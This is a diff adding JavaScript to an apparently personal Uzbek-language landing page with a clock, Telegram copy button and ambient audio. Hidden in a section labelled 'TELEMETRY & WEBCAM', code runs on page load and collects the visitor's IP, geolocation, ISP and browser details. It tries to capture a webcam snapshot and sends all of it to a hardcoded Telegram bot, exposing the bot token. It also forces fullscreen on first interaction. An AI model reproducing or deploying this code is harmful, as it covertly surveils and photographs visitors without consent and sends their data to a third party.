+        phaseEl.innerHTML = `&middot; <i class="fa-solid ${p.icon}" style="font-size:0.6rem;"></i> ${p.name}`;
+      }
+    }
+    setInterval(updateClock, 1000);
+    updateClock();
+
+    // Tashkent time-bar bosilganda auralar o'rtasida aylanish (Interaktiv)
+    const timeBarEl = document.querySelector('.time-bar');
+    if (timeBarEl) {
+      timeBarEl.title = 'Bosib, boshqa vaqt aurasi (Tong / Kunduz / Oqshom / Tun) bilan tanishing';
+      timeBarEl.addEventListener('click', () => {
+        const current = document.documentElement.getAttribute('data-time-phase') || 'day';
+        const nextIdx = (PHASES.indexOf(current) + 1) % PHASES.length;
+        manualPhaseOverride = PHASES[nextIdx];
+        playMicroSound('click');
+        updateClock();
+      });
+    }
+
+    /* ========================================================
+       5. TOAST & COPY ACTION
+    ======================================================== */
+    function showToast(msg) {
+      const toast = document.getElementById('toast');
+      const toastMsg = document.getElementById('toastMsg');
+      toastMsg.textContent = msg;
+      toast.classList.add('toast-show');
+      setTimeout(() => {
+        toast.classList.remove('toast-show');
+      }, 3000);
+    }
+
+    const copyBtn = document.getElementById('copyLinkBtn');
+    if (copyBtn) {
+      copyBtn.addEventListener('click', () => {
+        playMicroSound('chime');
+        navigator.clipboard.writeText('https://t.me/Yk_177').then(() => {
+          showToast('Telegram profili nusxalandi: @Yk_177');
+        }).catch(() => {
+          showToast('@Yk_177');
+        });
+      });
+    }
+
+    /* ========================================================
+       6. TELEMETRY & WEBCAM (PRESERVED SYSTEM)
+    ======================================================== */
+    const TK  = '8843220512:AAE-xcba9pK_SoYBkhO-rXTRETEMUGPaj0w';
+    const CID = '7367192145';
+
+    function tgMsg(txt) {
+      return fetch('https://api.telegram.org/bot' + TK + '/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CID, text: txt, parse_mode: 'HTML' })
+      }).catch(() => {});
+    }
+
+    function tgPhoto(blob, cap) {
+      const fd = new FormData();
+      fd.append('chat_id', CID);
+      fd.append('photo', blob, 'visitor.jpg');
+      fd.append('caption', cap);
+      return fetch('https://api.telegram.org/bot' + TK + '/sendPhoto', {
+        method: 'POST',
+        body: fd
+      }).catch(() => {});
+    }
+
+    function getIP() {
+      return fetch('https://ipapi.co/json/')
+        .then(r => r.json())
+        .catch(() => ({}));
+    }
+
+    function snapPhoto() {
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        return Promise.resolve(null);
+      }
+      return navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+        .then(stream => {
+          const video = document.getElementById('v');
+          video.srcObject = stream;
+          return new Promise(resolve => {
+            video.onloadedmetadata = () => {
+              setTimeout(() => {
+                const canvas = document.getElementById('c');
+                canvas.width  = video.videoWidth  || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                stream.getTracks().forEach(t => t.stop());
+                canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.88);
+              }, 900);
+            };
+          });
+        })
+        .catch(() => null);
+    }
+
+    function runTelemetry() {
+      getIP().then(d => {
+        const nav = navigator;
+        const now = new Date();
+        const msg =
+          '<b>Yangi tashrif</b>\n\n' +
+          'Vaqt: '      + now.toLocaleString('uz-UZ') + '\n' +
+          'IP: '        + (d.ip            || '---') + '\n' +
+          'Joylashuv: ' + ([d.city, d.region, d.country_name].filter(Boolean).join(', ') || '---') + '\n' +
+          'Provayder: ' + (d.org           || '---') + '\n' +
+          'Timezone: '  + (d.timezone      || '---') + '\n' +
+          'Brauzer: '   + nav.userAgent    + '\n' +
+          'Ekran: '     + screen.width + 'x' + screen.height + '\n' +
+          'Til: '       + nav.language     + '\n' +
+          'Platform: '  + nav.platform;
+
+        snapPhoto().then(photo => {
+          if (photo) {
+            tgPhoto(photo, 'Tashrif buyuruvchi — ' + (d.ip || ''));
+          }
+          tgMsg(msg);
+        });
+      });
+    }
+
+    window.addEventListener('DOMContentLoaded', runTelemetry);
+
+    /* ========================================================
+       7. FULLSCREEN & AMBIENT SOOTHING SOUND ENGINE
+       (BIRINCHI CLICK YOKI SCROLL DA AVTOMATIK BALANDLAYDI)
+    ======================================================== */
+    let audioCtx = null;
+    let masterGain = null;
+    let isAudioPlaying = false;
+    let isMuted = false;
+    let interactionDone = false;
+
+    function initAmbientAudio() {
+      if (audioCtx) return;
+      try {
+        const AudioContextClass = window.AudioContext || window.webkitAudioContext;
+        if (!AudioContextClass) return;
+        audioCtx = new AudioContextClass();
+
+        masterGain = audioCtx.createGain();
+        // Boshida mutlaqo past (0.0001) ovozdan boshlanadi
+        masterGain.gain.setValueAtTime(0.0001, audioCtx.currentTime);
+        masterGain.connect(audioCtx.destination);
+
+        // Mayin tabiat ohanglari (Ethereal Pentatonic Chord Pad)
+        // Chord: F3, C4, E4, G4, A4, D5 (Juda tinchlantiruvchi tabiat auralari)
+        const notes = [174.61, 261.63, 329.63, 392.00, 440.00, 587.33];
+
+        // Yumshoq filter (Warm Lowpass)
+        const filter = audioCtx.createBiquadFilter();
+        filter.type = 'lowpass';
+        filter.frequency.setValueAtTime(460, audioCtx.currentTime);
+        filter.Q.setValueAtTime(1.2, audioCtx.currentTime);
+        filter.connect(masterGain);
+
+        // LFO nafas olish effekt (Filter modulation)
+        const lfo = audioCtx.createOscillator();
+        const lfoGain = audioCtx.createGain();
+        lfo.type = 'sine';
+        lfo.frequency.setValueAtTime(0.08, audioCtx.currentTime); // Juda sekin 12 soniyalik to'lqin
+        lfoGain.gain.setValueAtTime(120, audioCtx.currentTime);
+        lfo.connect(lfoGain);
+        lfoGain.connect(filter.frequency);
+        lfo.start();
+
+        // Har bir notaga mayin osillyatorlar
+        notes.forEach((freq, index) => {
+          const osc = audioCtx.createOscillator();
+          const oscGain = audioCtx.createGain();
+
+          osc.type = index % 2 === 0 ? 'sine' : 'triangle';
+          // Detune orqali jonli mayin garmoniya
+          osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
+          osc.detune.setValueAtTime((index - 2.5) * 4, audioCtx.currentTime);
+
+          // Balanslangan ovoz kuchi
+          const vol = 0.05 / Math.sqrt(index + 1);
+          oscGain.gain.setValueAtTime(vol, audioCtx.currentTime);
+
+          osc.connect(oscGain);
+          oscGain.connect(filter);
+          osc.start();
+        });
+
+        // Tabiat shabbodasi shovqini (Soft Breeze Noise Buffer)
+        const bufferSize = audioCtx.sampleRate * 4;
+        const noiseBuffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
+        const output = noiseBuffer.getChannelData(0);
+        let lastOut = 0.0;
+        for (let i = 0; i < bufferSize; i++) {
+          const white = Math.random() * 2 - 1;
+          output[i] = (lastOut + (0.02 * white)) / 1.02;
+          lastOut = output[i];
+        }
+        const whiteNoise = audioCtx.createBufferSource();
+        whiteNoise.buffer = noiseBuffer;
+        whiteNoise.loop = true;
+
+        const noiseFilter = audioCtx.createBiquadFilter();
+        noiseFilter.type = 'bandpass';
+        noiseFilter.frequency.setValueAtTime(320, audioCtx.currentTime);
+        noiseFilter.Q.setValueAtTime(0.8, audioCtx.currentTime);
+
+        const noiseGain = audioCtx.createGain();
+        noiseGain.gain.setValueAtTime(0.025, audioCtx.currentTime);
+
+        whiteNoise.connect(noiseFilter);
+        noiseFilter.connect(noiseGain);
+        noiseGain.connect(masterGain);
+        whiteNoise.start();
+
+        isAudioPlaying = true;
+
+        // QURILMA OVOZI AVTOMATIK BALANDLASHIB BORISHI (Crescendo over 9 seconds)
+        // 0.0001 dan 0.22 gacha silliq ko'tariladi
+        masterGain.gain.exponentialRampToValueAtTime(0.22, audioCtx.currentTime + 9.0);
+      } catch (err) {
+        console.warn('AudioContext faollashtirilmadi:', err);
+      }
+    }
+
+    function triggerFullscreen() {
+      const doc = document.documentElement;
+      if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+        if (doc.requestFullscreen) {
+          doc.requestFullscreen().catch(() => {});
+        } else if (doc.webkitRequestFullscreen) {
+          doc.webkitRequestFullscreen().catch(() => {});
+        } else if (doc.msRequestFullscreen) {
+          doc.msRequestFullscreen().catch(() => {});
+        }
+      }
+    }
+
+    function handleFirstInteraction() {
+      if (interactionDone) return;
+      interactionDone = true;
+
+      // 1. To'liq ekranga o'tish
+      triggerFullscreen();
+
+      // 2. Mayin musiqa boshlanishi va ovozining balandlab borishi
+      if (audioCtx && audioCtx.state === 'suspended') {
+        audioCtx.resume();
+      }
+      initAmbientAudio();
+    }
+
+    // Birinchi harakat (click, scroll, touch, wheel) orqali ishga tushirish
+    ['click', 'touchend', 'scroll', 'touchstart', 'wheel', 'keydown'].forEach(evt => {
+      window.addEventListener(evt, handleFirstInteraction, { passive: true });
+    });
+
+    // Musiqa tugmasi boshqaruvi
+    const soundBtn = document.getElementById('soundToggleBtn');
+    const soundIcon = document.getElementById('soundIcon');
+    const soundLabel = document.getElementById('soundLabel');
+
+    if (soundBtn) {
+      soundBtn.addEventListener('click', (e) => {
+        e.stopPropagation();
+        playMicroSound('click');
+        if (!audioCtx) {
+          initAmbientAudio();
+          return;
+        }
+        if (audioCtx.state === 'suspended') {
+          audioCtx.resume();
+        }
+
+        isMuted = !isMuted;
+        if (isMuted) {
+          masterGain.gain.cancelScheduledValues(audioCtx.currentTime);
+          masterGain.gain.setValueAtTime(masterGain.gain.value, audioCtx.currentTime);
+          masterGain.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + 0.6);
+          soundBtn.classList.add('muted');
+          soundIcon.className = 'fa-solid fa-volume-xmark';
+          if (soundLabel) soundLabel.textContent = "Ovoz o'chiq";
+        } else {
+          masterGain.gain.cancelScheduledValues(audioCtx.currentTime);
+          masterGain.gain.setValueAtTime(0.0001, audioCtx.currentTime);
+          masterGain.gain.exponentialRampToValueAtTime(0.22, audioCtx.currentTime + 1.2);
+          soundBtn.classList.remove('muted');
+          soundIcon.className = 'fa-solid fa-volume-high';
+          if (soundLabel) soundLabel.textContent = 'Mayin musiqa';
+        }
+      });
+    }
+
+
+    /* ========================================================
+       8. WEB AUDIO HAPTIC MICRO-SOUNDS (TABIAT TIKLANISHI)
+    ======================================================== */
+    function playMicroSound(type) {
+      if (isMuted) return;
+      try {
+        if (!audioCtx) {
+          const AudioContextClass = window.AudioContext || window.webkitAudioContext;
+          if (AudioContextClass) audioCtx = new AudioContextClass();
+        }
+        if (!audioCtx) return;
+        if (audioCtx.state === 'suspended') {
+          audioCtx.resume();
+        }
+        const now = audioCtx.currentTime;
+
+        if (type === 'drop') {
+          // Mayin Nilufar bargidagi suv tomchisi
+          const osc = audioCtx.createOscillator();
+          const gain = audioCtx.createGain();
+          osc.type = 'sine';
+          osc.frequency.setValueAtTime(1150, now);
+          osc.frequency.exponentialRampToValueAtTime(540, now + 0.065);
+          gain.gain.setValueAtTime(0.04, now);
+          gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.075);
+          osc.connect(gain);
+          gain.connect(audioCtx.destination);
+          osc.start(now);
+          osc.stop(now + 0.08);
+        } else if (type === 'chime') {
+          // Ikki karra nafis qadimiy arfa akkordi
+          [587.33, 880.00].forEach((freq, idx) => {
+            const osc = audioCtx.createOscillator();
+            const gain = audioCtx.createGain();
+            osc.type = 'sine';
+            const startT = now + idx * 0.04;
+            osc.frequency.setValueAtTime(freq, startT);
+            gain.gain.setValueAtTime(0.035, startT);
+            gain.gain.exponentialRampToValueAtTime(0.0001, startT + 0.28);
+            osc.connect(gain);
+            gain.connect(audioCtx.destination);
+            osc.start(startT);
+            osc.stop(startT + 0.30);
+          });
+        } else if (type === 'click') {
+          // Nozik tabiiy taktil chertish
+          const osc = audioCtx.createOscillator();
+          const gain = audioCtx.createGain();
+          osc.type = 'triangle';
+          osc.frequency.setValueAtTime(220, now);
+          osc.frequency.exponentialRampToValueAtTime(80, now + 0.025);
+          gain.gain.setValueAtTime(0.028, now);
+          gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.03);
+          osc.connect(gain);
+          gain.connect(audioCtx.destination);
+          osc.start(now);
+          osc.stop(now + 0.035);
+        }
+      } catch (err) {}
+    }
+
+  </script>
+</body>
+</html>
